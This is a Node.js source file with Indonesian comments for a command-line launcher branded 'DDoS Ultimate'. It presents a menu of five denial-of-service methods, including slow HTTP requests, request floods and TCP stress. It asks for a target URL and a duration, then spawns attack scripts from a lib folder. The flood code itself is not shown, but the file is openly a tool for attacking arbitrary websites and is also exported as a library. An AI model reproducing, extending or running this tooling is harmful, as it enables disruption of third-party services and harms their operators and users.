const { spawn } = require('child_process');
const path = require('path');
const readline = require('readline');

// --- ENGINE ASLI DARI HAXORDOS ---
const executeScript = (scriptName, url, time) => {
    // Ganti Copyright jadi nama lu
    console.log('\x1b[1;33m%s\x1b[0m', 'Copyright: zer'); 
    const scriptPath = path.join(__dirname, 'lib', `${scriptName}.js`);
    const child = spawn('node', [scriptPath, url, time], {
        stdio: 'inherit',
        shell: true
    });

    child.on('error', (err) => {
        console.error(`Error executing ${scriptName}:`, err);
    });
};

const hacxorDos = {
    SlowRiss: (url, time) => executeScript("slowRiss", url, time),
    netTcp: (url, time) => executeScript("netTcp", url, time),
    fastDuck: (url, time) => executeScript("fastDuck", url, time),
    CrawlDos: (url, time) => executeScript("CrawlDos", url, time),
    httpEndpoint: (url, time) => executeScript("httpEndpoint", url, time)
};

// --- BAGIAN UI (CLI TOOL) ---
// Kalo dijalanin langsung pake 'node index.js', dia bakal buka UI
if (require.main === module) {
    
    // Fungsi Bikin Garis
    const line = "=".repeat(50);

    console.log("\x1b[35m" + `
     .ed"""" """$$$$be.
   -"           ^""**$$$e.
 ."                   '$$$c
/                      "4$$b
d  3                      $$$$
$  *                   .$$$$$$
.$  ^c           $$$$$e$$$$$$$$.
d$L  4.         4$$$$$$$$$$$$$$b
$$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
$$$$P d$$$$F $ $$$$$$$$$- $$$$$$
3$$$F "$$$$b   $"$$$$$$$  $$$$*"
 $$P"  "$$b   .$ $$$$$...e$$
  *c    ..    $$ 3$$$$$$$$$$$$eF
    %ce""    $$$  $$$$$$$$$$$$$$*
     *$e.    *** d$$$$$"L$$$$$$$$$
      $$$      4J$$$$$% $$$ $$$$$$
     $"'$=e....$*$$**$cz$$" ".*$"
     $  *=%4.$ L L$ P3$$ $F "$ $b
     $   "%*eb JL eb "zb$ $$bb 3
      $      "L -$$b  "$$  "$$*"
      $$       "c "*$b  "*e  "$.
       *       "$e  "$$ "
               "*e.  "c
                  "$b
` + "\x1b[0m");

    console.log("\x1b[36m" + "╔" + line + "╗");
    console.log("\x1b[36m║\x1b[33m          [ C332y // DDoS Ultimate ]          \x1b[36m║");
    console.log("\x1b[36m╚" + line + "╝\x1b[0m\n");

    console.log("\x1b[33m[1]\x1b[0m SlowRiss      - Slow HTTP Request Attack");
    console.log("\x1b[33m[2]\x1b[0m CrawlDos      - Crawler Based Bypass");
    console.log("\x1b[33m[3]\x1b[0m fastDuck      - Rapid Request Flood");
    console.log("\x1b[33m[4]\x1b[0m netTcp        - TCP Layer Stress");
    console.log("\x1b[33m[5]\x1b[0m httpEndpoint  - Endpoint Targeting\n");

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('\x1b[36m[?] Select Methods <1-5> : \x1b[0m', (method) => {
        rl.question('\x1b[36m[?] Target URL          : \x1b[0m', (url) => {
            rl.question('\x1b[36m[?] Time (seconds)      : \x1b[0m', (time) => {
                
                let methodName = "";
                switch(method) {
                    case '1': methodName = "SlowRiss"; hacxorDos.SlowRiss(url, time); break;
                    case '2': methodName = "CrawlDos"; hacxorDos.CrawlDos(url, time); break;
                    case '3': methodName = "fastDuck"; hacxorDos.fastDuck(url, time); break;
                    case '4': methodName = "netTcp"; hacxorDos.netTcp(url, time); break;
                    case '5': methodName = "httpEndpoint"; hacxorDos.httpEndpoint(url, time); break;
                    default: console.log("\x1b[31m[-] Invalid method!\x1b[0m"); process.exit(1);
                }

                console.log(`\n\x1b[32m[+] Attack Initiated on ${url} using ${methodName} for ${time} seconds...\x1b[0m\n`);
                rl.close();
            });
        });
    });
}

// Export tetep ada biar orang lain bisa pake sebagai library kalo mau
module.exports = hacxorDos;
